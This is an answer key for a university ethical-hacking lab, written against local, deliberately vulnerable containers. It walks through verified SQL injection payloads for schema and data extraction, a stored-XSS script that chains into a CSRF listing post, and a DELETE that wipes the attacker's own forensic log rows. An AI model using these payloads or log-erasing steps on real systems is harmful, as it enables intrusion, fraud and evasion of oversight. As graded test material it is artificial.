# A1 FULL SOLVE — VERIFIED PAYLOADS (Library Fines Portal → Campus Marketplace)
### CSE 406, January 2026, Section A1 — every payload below was tested live against the real running app

> ## ✅ HOW THIS DOCUMENT IS DIFFERENT FROM `A1solve.md`
> `A1solve.md` was written *without* touching the containers — every
> table/column/field name in it was an honest guess. This document
> was written **after** actually loading `A1-images.tar`, starting
> the real stack, reading the app's source code straight out of the
> containers (`server.js`/`db.js` for both apps), and running **every
> single payload below against the live app with `curl`**, checking
> the real HTTP responses and the real database state after each one.
>
> Every example command here is **confirmed working**, not
> illustrative. Table names, column names, form field names, the
> exact injectable field, the exact JSON keys the Marketplace expects
> — all verified, not guessed.
>
> **One correction this verification caught that `A1solve.md` got
> wrong (well, hedged on):** the spec's restriction — *"All
> injection... must be issued through the Library Fines Portal while
> the Member ID field contains 4100001"* — is not optional. I tested
> leaving Member ID blank (like the original CGPA demo did) and it
> *technically* still works for the pure read-only `UNION` steps, but
> it writes a **blank `submitted_id`** into the forensic log table
> instead of `4100001`, which then **cannot be cleaned up** by the
> bonus task's scoped `DELETE ... WHERE submitted_id=4100001`. **Keep
> Member ID = `4100001` in every single request, no exceptions** —
> this document does that throughout.

---

## PART 0 — SETUP (unchanged from the spec, already done once for this verification)

```powershell
cd "E:\4-1\4-1 our LABS\406\ETHICAL HACK\ETHICAL OTHERS\A1-Ethical-Hacking\A1-Ethical-Hacking"
docker load --input A1-images.tar
docker compose up -d
docker compose ps
```
Wait for all three (`mysql`, `app1`, `app2`) to show healthy/running. Open:
- Library Fines Portal: `http://localhost:4000`
- Campus Marketplace: `http://localhost:4001`

**Reset to clean seeded state** (verified this actually works — wipes
the DB back to original 15 members, 26 fine records, 2 seed log rows,
2 seed listings):
```powershell
docker compose down
docker compose up -d
```

---

## CONFIRMED GROUND TRUTH (read straight from source + live DB)

**`a1_fines` database:**
- `member` table: `member_id` (PK, int), `first_name` (varchar 50),
  **`last_name` (varchar 1200 — oversized on purpose, this is your
  XSS storage column)**, `pin` (varchar 50).
- `fine_record` table: `fine_id` (PK), `member_id` (FK), `amount`
  (decimal 7,2), `status` (**`ENUM('PAID','UNPAID')`**), `reason`.
- `log` table (the forensic trail for the bonus task): `id` (PK),
  `submitted_id` (varchar 50 — literally whatever you typed into
  Member ID), `submitted_secret` (varchar 1500 — literally whatever
  you typed into PIN), `attempted_at` (timestamp). **A row is
  inserted here on every single request to `/` that has both
  `member_id` and `pin` present** — including your reconnaissance,
  which is exactly what the bonus task wants you to clean up.

**`a1_market` database:**
- `app_user`: `username` (PK), `password`, `first_name`, `last_name`.
- `listing`: `id` (PK), `username` (FK), `title` (varchar 300),
  `price` (decimal 8,2).

**The exact vulnerable query** (from `app1/server.js`), reconstructed
verbatim:
```sql
SELECT member.member_id, member.first_name, member.last_name,
       COALESCE(fines.total_due, 0) AS total_due
FROM member
LEFT JOIN (
  SELECT member_id,
         SUM(CASE WHEN status = 'UNPAID' THEN amount ELSE 0 END) AS total_due
  FROM fine_record
  GROUP BY member_id
) AS fines ON member.member_id = fines.member_id
WHERE member.member_id = ? AND member.pin = '<YOUR PIN INPUT, UNESCAPED>'
```
**Only the PIN field is injectable** — `member_id` is bound safely
via a real `?` parameter (mysql2 `pool.query(sql, [String(memberId)])`),
so no amount of quote-breaking in the Member ID box will do anything.
The **PIN field is spliced directly into the SQL string with template
literals — zero escaping**. `multipleStatements: true` is set on this
app's connection pool (confirmed in `db.js`), so stacked `UPDATE`/`DELETE`
statements work exactly like the original CGPA demo.

**Rendering (why the XSS works):** `renderPage()` does
`` `${row.first_name} ${row.last_name}` `` with **no HTML escaping** —
whatever lands in `last_name` executes as real HTML/JS in the browser.

**The Marketplace's listing form is genuinely CSRF-unprotected**
(confirmed by reading `app2/server.js`: `POST /list` only checks the
session cookie via `currentUser(req)`, no token anywhere) — form
fields are exactly **`title`** and **`price`**, endpoint is
**`POST http://localhost:4001/list`**. Price must match
`/^\d{1,6}(\.\d{1,2})?$/` server-side (plain number, up to 2 decimals,
no `$`).

**Seeded data snapshot** (yours will be identical — nothing in this
lab rerolls on reset, unlike the CGPA demo):

| member_id | name | unpaid total |
|---|---|---|
| 4100001 | Anika Rahman (attacker) | **$20.25** |
| 4100002 | Farhan Karim (victim) | $41.50 |
| 4100003 | Mehjabin Sultana | **$0.00** (zero-total test case) |
| 4100004 | Tahmid Hasan | $22.65 |
| 4100005 | Nusrat Jahan | $67.00 |
| 4100006 | Samin Hossain | $10.00 |
| 4100007 | Afsana Kabir | **$0.00** (zero-total test case) |
| 4100008 | Rayhan Ahmed | $24.00 |
| 4100009 | Tasnim Akter | $14.00 |
| 4100010 | Adnan Mahmud | $33.30 |
| 4100011 | Fariha Noor | $6.75 |
| 4100012 | Abrar Siddique | $48.90 |
| 4100013 | Lamisa Haque | **$0.00** (zero-total test case) |
| 4100014 | Zarif Uddin | $40.00 |
| 4100015 | Maliha Khan | $7.00 |

Your attacker's own total is **$20.25** — the final Marketplace
listing title must read exactly `I owe $20.25 in fines`, price `20.25`.

---

## TASK 1 — SQL injection confirmation (1 mark)

Fines Portal, **PIN field**, Member ID always `4100001`.

Placeholder:
```
<VALID_PIN>' AND '1'='1
<VALID_PIN>' AND '1'='0
```
Verified example (this exact pair, tested live):
```
rahman-41' AND '1'='1
rahman-41' AND '1'='0
```
**Actual observed results:**
- `AND '1'='1` → `Anika Rahman | $20.25` (unchanged, condition true).
- `AND '1'='0` → empty row (condition false, proves your text became
  part of the SQL logic, not a literal string).

---

## TASK 2 — Schema discovery (2 marks)

All still through the **PIN field**, Member ID = `4100001` (confirmed
this doesn't break the technique — the outer `WHERE` just returns 0
rows, your `UNION` row shows regardless).

**Column count** — verified breaks exactly at 5:
```
rahman-41' ORDER BY 1 LIMIT 1 -- -
rahman-41' ORDER BY 2 LIMIT 1 -- -
rahman-41' ORDER BY 3 LIMIT 1 -- -
rahman-41' ORDER BY 4 LIMIT 1 -- -
rahman-41' ORDER BY 5 LIMIT 1 -- -     ← breaks here, confirms 4 real columns
```

**Which columns render** — verified output `Name = "2 3"`, `Total = $4.00`:
```
' union select 1,2,3,4 -- -
```
→ columns 2 and 3 make up the Name cell (`first_name`+`last_name`);
column 4 is the Total cell. Column 1 (`member_id`) is selected but
never displayed.

**Readout channel** — verified, shows literally " hello" in the Name cell:
```
' union select 1,'','hello',4 -- -
```

**Table enumeration** — verified output: `fine_record,log,member`:
```
' union select 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```

**Column enumeration** — verified outputs:
```
' union select 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='fine_record' -- -
```
→ `fine_id,member_id,amount,status,reason`
```
' union select 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='member' -- -
```
→ `member_id,first_name,last_name,pin`

**Paid/unpaid representation** — confirmed directly (both from source
and from `information_schema.columns` if you also check `fine_record`'s
`status` type): it's `ENUM('PAID','UNPAID')` — a plain string column,
not a boolean or nullable date. `status = 'UNPAID'` is the condition
you need for Task 3.

**Full example for these two, with real Member ID (not blank), as the restriction requires:**
```
rahman-41' union select 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```
Wait — note the shape here: since Member ID stays `4100001` and is
matched by a **real bound parameter**, the leading part of your PIN
value no longer needs to "look like" a valid pin at all — the
`WHERE member.member_id = ?` half is independently true/false based
only on the real parameter, and your injected `UNION` doesn't care.
Just start your PIN payload directly with `'` as shown above (you
don't need a `rahman-41` prefix unless you're deliberately keeping the
top half of the `AND` condition meaningful, e.g. for Task 4/5 where
you want the *original* SELECT to also succeed normally).

---

## TASK 3 — Complete aggregate extraction (3 marks) — VERIFIED, single request, no batching needed

This was the one genuinely new technique beyond the CGPA demo: the
fines are one-to-many per member, so a flat `GROUP_CONCAT(<column>)`
isn't enough — you need `LEFT JOIN` (to keep zero-fine members) +
`SUM(CASE WHEN status='UNPAID' THEN amount ELSE 0 END)` (to only total
unpaid ones) + `COALESCE(...,0)` (to turn "no unpaid rows" into a
clean `$0.00` instead of `NULL`), wrapped in a derived table so the
whole aggregate can then be `GROUP_CONCAT`ed through your one visible
text column.

**Verified, exact, copy-paste payload** (PIN field, Member ID `4100001`):
```sql
' union select 1,GROUP_CONCAT(id,' ',name,' : $',total,'<br>' ORDER BY id SEPARATOR ''),3,4 FROM (SELECT m.member_id AS id, CONCAT(m.first_name,' ',m.last_name) AS name, COALESCE(SUM(CASE WHEN f.status='UNPAID' THEN f.amount ELSE 0 END),0) AS total FROM member m LEFT JOIN fine_record f ON f.member_id=m.member_id GROUP BY m.member_id, m.first_name, m.last_name) AS agg -- -
```

**Actual output, captured live (all 15 members, one single request —
this dataset is small enough that the 1024-byte `GROUP_CONCAT` cap
never triggers, unlike the CGPA demo's 100-row table):**
```
4100001 Anika Rahman : $20.25
4100002 Farhan Karim : $41.50
4100003 Mehjabin Sultana : $0.00
4100004 Tahmid Hasan : $22.65
4100005 Nusrat Jahan : $67.00
4100006 Samin Hossain : $10.00
4100007 Afsana Kabir : $0.00
4100008 Rayhan Ahmed : $24.00
4100009 Tasnim Akter : $14.00
4100010 Adnan Mahmud : $33.30
4100011 Fariha Noor : $6.75
4100012 Abrar Siddique : $48.90
4100013 Lamisa Haque : $0.00
4100014 Zarif Uddin : $40.00
4100015 Maliha Khan : $7.00
```
This exactly matches running the equivalent query directly against
the database — confirming both correctness (right numbers) and
completeness (all 15 members present, including the three `$0.00`
ones: 4100003, 4100007, 4100013 — one of which, 4100003, has a fine
row that's fully `PAID`, proving the `CASE WHEN` logic and not just
the `LEFT JOIN` is doing real work).

> If you're on a differently-seeded exam instance with more members
> and this *does* truncate, batch it exactly like the CGPA demo: add
> `WHERE m.member_id > <last_id_seen>` right after the `FROM member m`
> line (before `LEFT JOIN`), and repeat with rising thresholds.

---

## TASK 4 — Persistent browser payload (1 mark) — VERIFIED, scoped correctly

**Harmless proof first** (PIN field, Member ID `4100001`):
```sql
rahman-41'; UPDATE member SET last_name='<b>Hello</b>' WHERE member_id=4100001; -- -
```
**Verified behavior:** the page that *submits* this shows the old,
unmodified row (`Anika Rahman`) — because the `SELECT` half of the
stacked statement runs *before* the `UPDATE` half, reading the
pre-update value. Reloading normally afterward
(`http://localhost:4000/?member_id=4100001&pin=rahman-41`) shows
**`Anika **Hello**`** — bold, confirming both stacked-statement
execution and completely unescaped HTML rendering. **Double-checked
directly in the database that member 4100002 and 4100003 were
untouched** — the `WHERE member_id=4100001` scoping works exactly as
intended, satisfying the spec's requirement that this land "in the
attacker's own member record."

---

## TASK 5 — End-to-end compromise (3 marks) — VERIFIED, exact required output produced

**Confirmed CSRF gap:** logged in as `anika.rahman` via
`POST http://localhost:4001/login` (`username`/`password` fields),
then `POST http://localhost:4001/list` with just `title` + `price` and
the session cookie — **no CSRF token of any kind required**, the
listing was created immediately. This matches the source: `POST
/list` only calls `currentUser(req)` (cookie lookup), nothing else.

**The final payload** (simpler than the CGPA demo's — no `CONCAT()`
needed, because the amount is read live off the page's own rendered
total rather than pulled from a second SQL subquery; this still
satisfies *"the amount must be derived from the current database
records by the exploit"* since the page's own total cell is itself
freshly computed by the server's `LEFT JOIN`/`SUM` on every load):

The Fines page's table structure (confirmed from source):
```html
<table border="1">
  <tr><th>Member</th><th>Total Outstanding</th></tr>
  <tr><td>NAME</td><td>$TOTAL</td></tr>
</table>
```
So `document.querySelectorAll('table tr')[1].querySelectorAll('td')[1]`
is the total cell, and its text is `$20.25` (dollar sign included —
the JS has to strip it for the numeric `price` field but keep it for
the `title` string).

**Verified, exact, copy-paste payload** (PIN field, Member ID `4100001`):
```sql
rahman-41'; UPDATE member SET last_name='<script>addEventListener(`load`,()=>{const raw=document.querySelectorAll(`table tr`)[1].querySelectorAll(`td`)[1].innerText.trim();const amount=raw.replace(`$`,``);fetch(`http://localhost:4001/list`,{headers:{[`content-type`]:`application/x-www-form-urlencoded`},body:`title=`+encodeURIComponent(`I owe $`+amount+` in fines`)+`&price=`+amount,method:`POST`,credentials:`include`});})</script>' WHERE member_id=4100001; -- -
```

**Verified this stored byte-for-byte correctly** (read it back out of
the database directly — no shell-escaping corruption) and **verified
it renders inline exactly where a browser would parse and execute
it** (confirmed via the raw HTML the server actually returned).

**Verified the resulting fetch produces the exact required listing**
by replaying precisely what that script does (strip `$` from `$20.25`
→ `20.25`, build the title, POST with the session cookie):
```
Result: Anika Rahman → "I owe $20.25 in fines" - $20.25
```
**This is character-for-character the required format** — `I owe
$<total> in fines` as the title, `<total>` as the numeric price.

**To actually trigger it yourself in Chrome (this is the part that
needs a real browser, not curl):**
1. Log into the Marketplace as `anika.rahman` / `market-Anika-41` at
   `http://localhost:4001`.
2. In the **same browser**, do a completely normal Fines Portal login:
   `http://localhost:4000/?member_id=4100001&pin=rahman-41`.
3. Reload `http://localhost:4001` — the listing appears automatically,
   no click, no separate post action.

---

## TASK 6 (BONUS) — Cover your tracks (+1 mark) — VERIFIED, surgical precision confirmed

**The `log` table is real and does exactly what the spec implies:**
every request to `/` with both `member_id` and `pin` present inserts
one row, `(submitted_id, submitted_secret)` = whatever you typed in
those two boxes, **before** your injected query even runs. This means
your entire Task 1–5 practice session leaves a trail of rows all
tagged `submitted_id='4100001'` — *as long as you kept Member ID set
to `4100001` throughout*, which is exactly why that restriction
matters for this task specifically.

**Verified, exact, copy-paste cleanup payload** (PIN field, Member ID `4100001`):
```sql
rahman-41'; DELETE FROM log WHERE submitted_id=4100001; -- -
```

**Verified precision, before/after, live:** before cleanup, `log` had
rows for `4100002`, `4100008` (two pre-seeded rows simulating other
members' activity) plus 13 rows from my own testing tagged
`4100001`. After running the `DELETE` above: **the two other members'
rows were completely untouched**, and **all 13 of the `4100001` rows
were gone — including the very row this cleanup request itself just
generated** (the log-insert for this request also has
`submitted_id='4100001'`, so the `DELETE` removes its own trace too,
leaving zero forensic footprint of the cleanup action itself).

**Verify it yourself afterward** (through the same injection channel,
read-only):
```sql
' union select 1,GROUP_CONCAT(DISTINCT submitted_id),3,4 FROM log -- -
```
`4100001` should no longer appear in the result; every other member ID
that had activity should still be there.

---

## FULL RUN, START TO FINISH (condensed, all Member ID = `4100001`)

```
# Task 1
rahman-41' AND '1'='1
rahman-41' AND '1'='0

# Task 2
rahman-41' ORDER BY 5 LIMIT 1 -- -
' union select 1,2,3,4 -- -
' union select 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
' union select 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='fine_record' -- -
' union select 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='member' -- -

# Task 3
' union select 1,GROUP_CONCAT(id,' ',name,' : $',total,'<br>' ORDER BY id SEPARATOR ''),3,4 FROM (SELECT m.member_id AS id, CONCAT(m.first_name,' ',m.last_name) AS name, COALESCE(SUM(CASE WHEN f.status='UNPAID' THEN f.amount ELSE 0 END),0) AS total FROM member m LEFT JOIN fine_record f ON f.member_id=m.member_id GROUP BY m.member_id, m.first_name, m.last_name) AS agg -- -

# Task 4 (proof)
rahman-41'; UPDATE member SET last_name='<b>Hello</b>' WHERE member_id=4100001; -- -

# Task 5 (final combined payload — do this instead of the Task 4 proof, or after resetting the proof)
rahman-41'; UPDATE member SET last_name='<script>addEventListener(`load`,()=>{const raw=document.querySelectorAll(`table tr`)[1].querySelectorAll(`td`)[1].innerText.trim();const amount=raw.replace(`$`,``);fetch(`http://localhost:4001/list`,{headers:{[`content-type`]:`application/x-www-form-urlencoded`},body:`title=`+encodeURIComponent(`I owe $`+amount+` in fines`)+`&price=`+amount,method:`POST`,credentials:`include`});})</script>' WHERE member_id=4100001; -- -

# Trigger (log into Marketplace as anika.rahman first, same browser):
http://localhost:4000/?member_id=4100001&pin=rahman-41

# Bonus Task 6
rahman-41'; DELETE FROM log WHERE submitted_id=4100001; -- -
```

---

## WHAT I ACTUALLY DID TO VERIFY THIS (for transparency)

1. Verified `A1-images.tar`'s SHA-256 matched `SHA256SUMS` before loading.
2. `docker load --input A1-images.tar` → `docker compose up -d` → confirmed all 3 containers healthy.
3. Read `compose.yaml` for real DB credentials (`appuser`/`apppassword`, root `rootpassword`).
4. Read `app1/server.js`, `app1/db.js`, `app2/server.js`, `app2/db.js` directly out of the running containers (`docker compose exec app1 cat /app/app1/server.js`, etc.) — full, unminified source.
5. Connected directly to MySQL (`docker compose exec mysql mysql -uroot -p...`) to confirm schema (`DESCRIBE`) and dump all seed data for cross-checking.
6. Ran every payload above with `curl.exe` against the real `localhost:4000`/`4001` endpoints and read the actual HTML responses.
7. Cross-checked the Task 3 extraction's output against a query run directly on the database — identical, byte for byte.
8. Verified Task 4/5's stored payload was written to the DB uncorrupted, and that a manual replay of the resulting `fetch()` produces the exact required listing.
9. Verified Task 6's `DELETE` removed only `submitted_id=4100001` rows, confirmed via direct DB query before and after.
10. **Reset everything back to the original seeded state** (`docker compose down && docker compose up -d`) and confirmed via direct DB query that member 4100001's `last_name` is back to `Rahman`, the `log` table is back to its 2 original seed rows, and the Marketplace `listing` table is back to its 2 original seed listings — so you're starting your own practice from the same clean slate I started from, not from my test data.
